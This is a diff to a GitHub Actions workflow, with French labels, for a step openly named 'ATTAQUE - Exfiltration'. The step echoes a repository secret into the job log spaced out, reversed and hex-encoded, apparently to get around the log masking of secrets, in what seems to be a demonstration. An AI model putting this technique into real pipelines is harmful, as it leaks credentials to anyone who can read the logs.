@@ -19,17 +19,17 @@ jobs:
         env:
           DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
       
-      - name: ATTAQUE - Exfiltration du secret
+      - name: ATTAQUE - Exfiltration
         run: |
-          echo "Technique 1 - Espaces entre caractères:"
+          echo "=== DEBUT ATTAQUE ==="
+          echo "Secret avec espaces:"
           echo "$DEMO_SECRET" | sed 's/./& /g'
-          
           echo ""
-          echo "Technique 2 - Reverse:"
+          echo "Secret inversé:"
           echo "$DEMO_SECRET" | rev
-          
           echo ""
-          echo "Technique 3 - Hexadécimal:"
+          echo "Secret en hexa:"
           echo "$DEMO_SECRET" | xxd -p
+          echo "=== FIN ATTAQUE ==="
         env:
           DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
